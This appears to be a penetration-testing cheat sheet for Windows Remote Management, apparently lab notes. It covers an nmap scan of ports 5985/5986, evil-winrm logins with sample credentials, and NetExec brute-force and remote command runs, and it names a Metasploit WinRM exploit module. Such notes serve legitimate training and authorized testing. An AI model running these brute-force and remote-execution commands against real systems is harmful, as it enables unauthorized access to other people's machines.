## Footprinting the Service
WinRM uses TCP ports `5985` (`HTTP`) and `5986` (`HTTPS`) by default.
```
nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n
```
If we want to find out whether one or more remote servers can be reached via WinRM, we can easily do this with the help of PowerShell. The [Test-WsMan](https://docs.microsoft.com/en-us/powershell/module/microsoft.wsman.management/test-wsman?view=powershell-7.2) cmdlet is responsible for this, and the host's name in question is passed to it. 
## Evil-Winrm
```shell
# inactive SSL - port 5985
evil-winrm -i $target -u Cry0l1t3 -p P455w0rD!
# active SSL - port 5986
evil-winrm -S -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!
```
## Brute Force NetExec
```bash
#crackmapexec
nxc winrm $target -u usernames.txt -p unix_password.txt
nxc winrm $target -u usernames.txt -p 'P455w0rD!' --continue-on-success
nxc winrm $target -u admin -p admin -x "whoami"
nxc winrm $target -u admin -p admin -x "systeminfo"
```
## Msfconsole
```
use exploit/windows/winrm/winrm_script_exec
```